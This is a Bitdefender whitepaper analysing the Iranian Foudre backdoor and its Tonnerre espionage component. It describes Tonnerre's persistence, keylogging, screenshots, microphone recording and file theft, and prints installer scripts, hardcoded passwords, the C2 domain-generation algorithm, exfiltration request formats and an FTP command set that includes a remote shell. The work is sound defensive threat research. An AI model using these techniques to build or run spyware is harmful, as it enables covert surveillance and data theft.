Bitdefender Whitepaper
Iranian APT Makes a Comeback with “Thunder and Lightning” Backdoor and Espionage Combo

Executive Summary

Key Findings:

Bitdefender researchers recently investigated the
decade-old Foudre (French for “lightning”) APT that now
uses a new component named “Tonnerre” (French for
“thunder”). First investigated in May 2016, the Foudre
malware is allegedly of Iranian origin and traditionally
targets both government and the private sector.

•

Decade-old Iranian APT still has active C&C
infrastructure

•

New C&C communication capabilities for “Foudre”
APT malware

•

“Tonnerre” component used for persistence,
surveillance and data exfiltration

Our investigation also revealed that the C&C
infrastructure is still active and that there are victims
phoning back home. It’s safe to speculate that this
particular Iranian APT is still operational despite flying
under the radar in recent years.

New TLDs for Tonnerre C&C infrastructure

Analyzing Foudre
and Tonnerre

The investigation started from a sample submitted for
analysis to our researchers . Once unpacked, the archive
contained both a document and a binary, both installing
a backdoor into the compromised machine. Since the
backdoor is designed to work on x86 and x64 Windows
machines, threat actors were likely betting that victims
would download and open the archive.
Apart from some improvements in the Foudre backdoor
involving C&C communication and forensic investigation
resilience tactics, the APT group also used a secondstage payload named Tonnerre. This second component
has several functionalities, ranging from persistence
to data exfiltration. This could allow attackers to take
screenshots, collect recent files and documents with
specific extensions, and even record audio using the
system’s microphone before uploading that data to the
attacker-controlled C&C.
In this recent investigation, Bitdefender security
researchers focused on dissecting the malicious
payloads and investigating their capabilities.

We were able to analyze the content of one of the zip
files:
Zip file: ‫لئاسرلا اورظتنا‬.zip 9c1982c30c5ac019417072eb6827de07
It contains 2 files, a Word document and an executable:
‫لئاسرلا اورظتنا‬.doc:
2d459929135993959cacceb0dd81a813
Program Office2019.exe:
491786aa4bc9d1f09b9c793b21e80073
Both the document and the “Program Office2019”
executable install the Foudre (version 23) backdoor on
the system, so the attacker uses two tactics to trick the
victim to install the malware.

2d459929135993959cacceb0dd81a813 – doc
analysis
The malicious document contains macros and an
embedded rar sfx executable. When opened, the macros
will run and will execute the embedded exe.

Iranian APT Makes a Comeback with “Thunder and Lightning” Backdoor and Espionage Combo

“conf3616.dll” is a dll responsible for installing the Foudre backdoor (“d530”). It is similar to the one described by
Tencent in a blog post from November 2020 (https://cloud.tencent.com/developer/article/1738806). The rar sfx exe
executes the installer dll like this:
Silent=1
Overwrite=2
Update=U
Path=%temp%\tmp5699
Setup=rundll32.exe conf3616.dll f8755 d530

491786aa4bc9d1f09b9c793b21e80073 (Program Office2019.exe) analysis
The sample is a RAR SFX self-extracting installer that contains 2 dlls and a jpg:
 827626def03076264c7948d47452e725– “conf3803.dll”
 cfee183cf4bbe22ecbdf0d73ff16e0fb– “d288”
 4bcdc131621953f3c0a58fe0e0c812f6- “Digi-Swirls.jpg”
This rar sfx exe is similar to the one in the document. Its role is to install the Foudre backdoor on the system using the
installer dll:
Silent=1
Overwrite=2
Update=U
Path=%temp%\tmp764
Setup=rundll32.exe conf3803.dll f8755 d288
Both the document and the executable installs the same variant of Foudre version 23:
cfee183cf4bbe22ecbdf0d73ff16e0fb.

cfee183cf4bbe22ecbdf0d73ff16e0fb – Foudre version 23

The sample is very similar to versions 21/22 described in Tencent’s blog post, sharing the same domain generating
algorithm (DGA). As mentioned by Tencent, the Foudre backdoor records keystrokes and sends keylogs to the C2, but
also downloads the next stage, which is deployed to high-value victims.

175bd76c33491d6b97731c8755ade093: Foudre’s next stage - Tonnere

The next stage downloaded by Foudre seems to be a variant of Infy M described by Palo Alto in 2016 (https://unit42.
paloaltonetworks.com/prince-of-persia-infy-malware-active-in-decade-of-targeted-attacks/). As they said, this variant of
Infy is sent only to high-value victims.
Even if they share many functionalities, this sample has a DGA, similar to the Foudre variant of Infy found by Palo Alto
in 2017. Also similar to the Foudre backdoor, we observed that the malware creates a window named “tonnere,” so it’s
safe to name the malware Tonnere.
The analyzed sample is Tonnere v11. This malware seems to have been used since 2017, as we found a Tonnere v1
sample that has the compilation timestamp 2017-01-04 15:38:26. The compilation timestamp for v11 we analyzed is
2019-06-20 16:51:34.

Detailed analysis

The malware is a rar sfx password-protected exe, downloaded and executed by the initial Foudre backdoor. The
password (“RBA4b5a98Q”) is hardcoded in the Foudre backdoor and sent as a command line parameter when it
executes Tonnere. The command line also contains the “/set” parameter, telling Tonnere to add persistence. The rar
archive contains an executable and a certificate used to validate the CNC’s responses.

dedbec01f4d61c65b24425b6039038f2 – Tonnere v11

The exe found in the archive is a Delphi executable that has 5 graphical forms, each one with a specific functionality:
•

Form 1: Deals with persistence and initialization of the malware

•

Form 2: Its role is to communicate with the cnc and collect files from different directories

4

Bitdefender Whitepaper
Iranian APT Makes a Comeback with “Thunder and Lightning” Backdoor and Espionage Combo

•

Form 3: Implements a ftp client that receives commands from the ftp server and executes them

•

Form 4: Seems to not be used, its functionality being implemented in Form2

•

Form 5: The role of this form is to record audio using the system’s microphone, but this functionality seems to be
disabled by default

Each of these forms will be described below.

Form1:
This form initializes various strings used by the malware and parses the command line and adds persistence,
depending on the parameters
•

The malware can receive 2 possible parameters:
●

/set<crc>: it installs the malware in programdata/Synaptics/<random>and executes it with the -ex
parameter
●

●

●

●

●

●

●

Persistence: Scheduled Task; in case it can’t add a scheduled task, as backup it adds a registers run key
It also receives a crc code as a parameters; It gets the machine GUID (SOFTWARE\Microsoft\
Cryptography\MachineGuid), it applies a CRC32s hash on it and compares the crc with the one provided
as parameter; If it doesn’t match, it stops execution
Generates a random directory in %programdata%/Synaptics/<random>

Saves the random directory name in registers, in HKEY_CURRENT_USER, L”Software\\temp”, L”tran1”; it also
adds the string “TNIV33M” in the global atom table to know that the malware was installed; on further runs, it
will check for “TNIV33M” and if found, will get the directory name from the registers
Copies itself as “helper.exe” and the public.cer in that directory
Runs the exe using the “-ex” command line parameters

-ex <crc>: executes the malware
●

●

It checks for the crc to match and also checks if the malware runs from a path that contains “synaptics”
(lower case)
Inits strings used by the malware

Form2:
•

The role of this form is to make screenshots, collect various files and communicate with the cnc

•

There are 2 main functions: Init, Timer

•

The initialization function:
●

●

Sets a timer for the (Timer) function that collects files (detailed below) and communicates with the cnc
Creates the base folder for the collected files:
●

●

●

“D:\dfserv\”or “E:\dfserv” if “dfserv.exe” is found running on the system and such a fixed drive
exists

5 other folders are created in the base folder:
●

●

●

●

●

●

%programdata%/Synaptics/G directory if “dfserv.exe” is not found running on the system (dfserv.
exeseems to be a component of Deep Freeze software)

S - used to store the screenshots
R - used to store the files found in %AppData%\Microsoft\Windows\Recent\

F - seems to be used to store files collected from system’s drives, but that functionality seems to be disabled
H - used to store various collected files (described below)
V - used to store microphone recordings

Creates a file “clist.dat” that keeps the list of the collected files; the file locations is as follows:
●

●

%programdata%if “dfserv.exe” is not running

“D:\dfserv\”or “E:\dfserv”if “dfserv.exe” is found running on the system and such a fixed drive
exists

5

Bitdefender Whitepaper
Iranian APT Makes a Comeback with “Thunder and Lightning” Backdoor and Espionage Combo

•

Creates a password used to compress the collected files:
●

●

•

Else, a hardcoded password is used: “1v-kQCh5eiBiSzKyE_HCQ”

The Init function also creates a function that monitors for new/modified files in %AppData%\Microsoft\
Windows\Recent\
●

●

•

If “public.cer” can be found in the malware folder, the archive password is random and is encrypted with the
public key

The collected files are archived and the archive is saved in the “R” folder
It collects files of sizes between 1 byte and 8mb

Clarification:
●

●

Before being saved in its corresponding folder (as detailed above), each file is compressed with FlexCompress
(.fxc format) and the archive is password protected;
At the end of each archive is appended the following hex encoded data:
●

●

●

●

●

●

●

●

•

<encypted_archive_password> or (“Error” if the default hardcoded password was used)
<computer_name>
<username>

<malware_version>

<main_folder>-- hardcoded to “fdir1”

<MachineGuid>-- from SOFTWARE\Microsoft\Cryptography\MachineGuid
<filepath>

There is one archive for one file, each file is compressed individually and the above data is appended to the
archive

The timer function:
●

Collects files measuring between 1 byte and 8mb from the current user’s:
●

●

●

●

●

●

Desktop folder
Download folder
Contacts folder

●

It looks only in same folders as for logical drives

Mentions:
 It only collect files with the following extensions: .doc, .docx, .xls, .xlsx, .xlr, .pps,
.ppt, .pptx, .mdb, .accdb, .db, .dbf, .sql, .jpg, .jpeg, .psd, .tif, .png,
.txt, .text, .rtf, .odt, .htm, .html, .pdf, .wps, .one, .contact, .csv,

.p12, .crt, .pem, .key, .pfx, .asc, .cer, .p7b, .sst
 “d877f783d5d3ef8c” is a directory used by Telegram
The files collected are archived (one archive per file) and the archives are saved in the “H” folder
●

•
•

The “clist.dat” file mentioned previously keeps information about the collected files
●

●

•

Each line has this format:
<crc32(filename)>-<filesize>-<timestamp_of_last_write_time>
The malware ensures that a file is exfiltrated only once using this file; if a file metadata (like above) already
appears in “clist.dat”, the file is skipped

The timer function is also responsible for communicating with the CNC, starting a thread that:
●

●

Makes some dummy requests to http://www.msn.com to check if the system is connected to the internet and a
proxy is used
Then, a DGA is used to get a responsive cnc; the DGA is similar to the Foudre’s DGA, but it uses other TLDs:
<base_url> = hex(crc(“NITV1” + year + week_number))
firstCNC = <base_url>.site

if firstCNC is not responding:
		
<lbd> = make request to https://www.france24.com/en/rss and get the last build
		
date (<lastBuildDate>) -- usually is the date of current day
		
<base_str> = “NITV1” + <lbd>.year + <lbd>.month + <lbd>.current_week
		
<base_url> = hex(crc32(<base_str>))
		
cnc = <base_url>.site
		

if cnc is not responding:

			
for i = 1, i <= 100; i++:
				
<base_url> = hex(crc(<base_str> + str(i)))
				
if any of <base_url>.site, <base_url>.win, <base_url>.com is re		
				
sponding, then that it will be used as cnc
		
If none of above cncs responded:
			
<base_url> = md5(GET http://www.breakingnews.com/feeds/rss)
			
if <base_url>.host is not responding:
				
<base_url> = md5(GET http://www.platts.com/rssfeeddetail/metals)
				
check if <base_url>.com is responding

•

A GET request is made to http://<cnc>//2016/?c=<computer_name>&u=<username>&v=<malware_
version>&f=<base_folder>&mi=<machine_guid>&t=<time_string> in order to download the next stage
●

●

•

•

The file is downloaded in %temp%/ftsdci32.tmp

All requests are using the following user agent: “Mozilla/5.0 (Windows NT 6.1; WOW64)
AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36”
“2.187.193.169” “2.187.193.169”
Validates the next stage exe using the signature file and runs it with the following arguments:
●

•

The file is downloaded in %temp%/fttemp01.tmp

A GET request is made to http://<cnc>//2017/?c=<computer_name>&u=<username>&v=<malware_
version>&f=<base_folder>&mi=<machine_guid>&t=<time_string> to download a signature used to verify the fresh
downloaded next stage
●

•

<time_string> has this format: “<year>-<month>-<day>--<hour>-<minute>-<second>”

-sp/set -pTtckjcAa54cE

Then it uploads each collected archive measuring at least 100 bytes and maximum 8mb to the cnc:
●

A POST request is made to http://<cnc>/blog/?<time_string> with the following body :
7

Bitdefender Whitepaper
Iranian APT Makes a Comeback with “Thunder and Lightning” Backdoor and Espionage Combo

●

•

c=<computer_name>&u=<username>&v=<malware_version>&f=<base_
folder>&txt=<base64(archive_content)>&e=EOF

The timer function also makes screenshots and saves them in %temp%:
●

The screenshot file names have this format:
●

●

“psf<year>-<month>-<day>--<hour>-<minutes>-<seconds>.tmp”

The screenshots are collected, archived and the archives are saved in the “S” folder

Form 3: ftp client with the role of communicating with the cnc
•

Init
●

•

Creates a ftp client with username <currentUsername> and password tpass14A43

Timer:
●

Calls a function that tries to get a ftp address from the cnc:
●

●

●

Makes a GET request to http://<cnc>/f/?c=<computer_name>&mi=<machine_guid>&t=<time_string>&d=<year_
day> in order to receive the address of a ftp server
The resulting file is saved in %temp%/rfttest1.tmp
“d” query parameter has this format:
<year><day_number>
●

●

Where <day_number> represents how many days passed since the beginning of the year

If the address is not “127.0.0.1”, the malware connects to the ftp server

•

To get a command, the ftp client use the Quote ftp method; the result of a command (success/fail) is sent using
SetLocalFileName with the appropriate value before making the Quote call

•

The server responds with a string in this format
“500 ?MY<command>”

•

•

The following commands can be sent by the server:
MYIDLE- do nothing
MYSYSINFO- uploads systems info to the ftp server
MYDIR- dir command
MYPUT- downloads a file from the ftp server
MYGET- uploads a file to the ftp server
MYZIPGET- uploads a file as zip it to the ftp server
MYDELETE- deletes a file
MYRENAME- renames a file
MYRUN - executes a files
MYENDTASK- terminates a process
MYZIP- zips a file
MYSHELL- remote shell
The only command not seen in the Infy M malware described by Palo Alto in 2016 is MYSYSINFO:
●

This commands gets the list of antivirus products, firewall products, running processes, network adapters and
uploads it to the ftp server

Form 4:
•

This form was not used in the Infy M described by Palo Alto , but its role seems to be to collect files from the logical
drives and store (archived as above) them in the “F” folder

•

This functionality is already present in Form2

Form 5: records audio using the system’s microphone
•

Initialization function:
●

8

Creates a folder named “lame” in the same directory where “clist.dat” can be found (%programdata% or
“dfserv” -- see above)

Bitdefender Whitepaper
Iranian APT Makes a Comeback with “Thunder and Lightning” Backdoor and Espionage Combo

●

●

●

•

The recording is stored in the same folder in a file named “tvfn.tmp”

The function starts the audio recording only if the first line of the “vc.dat” file is “active”; however, the
first line of “vc.dat” that the malware drops is “Off”, so it seems that this functionality is not enabled by
default and may be enabled using commands received from the cnc

Timer1 function:
●

When the file size exceeds 5mb, the audio recording is paused, the file is renamed and converted to mp3 and in
the end the audio recording is resumed:
●

•

Creates a file named “vc.dat” in the “lame” folder that stores instructions for audio recording, including
minimum volume level, minimum active time and a command line to convert from waw to mp3:
“lame.exe -b 8 -m m rvfrtc8.tmp fcvd10v.tmp”

The “tvfn.tmp”waw file is renamed into “rvfrtc8.tmp” then converted to mp3 using the command
from “vc.dat” (see above); the resulted mp3 file is named “fcvd10v.tmp”

Timer2 function:
●

●

●

The role of this function is to collect the mp3 file to be exfiltrated
The mp3 file is archived (like described above.) and the archive is saved in the “V” folder
In the end, the mp3 file “fcvd10v.tmp”and the waw file “rvfrtc8.tmp”are deleted

Command and Control servers for Tonnerre
and Foudre
Tonnere uses the TLDs “site”, “win” and “com”.
The different Foudre versions sometimes use different TLD combinations consisting of: “space,”net”,”top”,”dynu.net”,
“info”, “website” and “host”. With this information we were able to locate the following historical and currently active
command and control servers.

Tonnerre sinkhole victims
Knowing the Tonnerre’s DGA, we could sinkhole a C2 and find new victims. More precisely, we sinkholed the domain
between 25-31 January: 4f04b918[.]site, where 4f04b918 is the CRC32 for “NITV1202114”.We found
79 IPs v4 and 43 IPs v6 that show normal malware traffic behavior, making the initial request to check if the C2 is
responsive using the user agent hardcoded in the Tonnerre v11 sample.
As the request that checks if a C2 is valid doesn’t contain information that could uniquely identify a victim, we can’t
accurately estimate the number of victims: the victims could have changed several times during the sinkhole period.
Below you can see a heat map of these IPs:

A trade of brilliance, data security is an industry where only the clearest view, sharpest mind and deepest insight can
win — a game with zero margin of error. Our job is to win every single time, one thousand times out of one thousand,
and one million times out of one million.
And we do. We outsmart the industry not only by having the clearest view, the sharpest mind and the deepest insight,
but by staying one step ahead of everybody else, be they black hats or fellow security experts. The brilliance of our
collective mind is like a luminous Dragon-Wolf on your side, powered by engineered intuition, created to guard against
all dangers hidden in the arcane intricacies of the digital realm.
This brilliance is our superpower and we put it at the core of all our game-changing products and solutions.
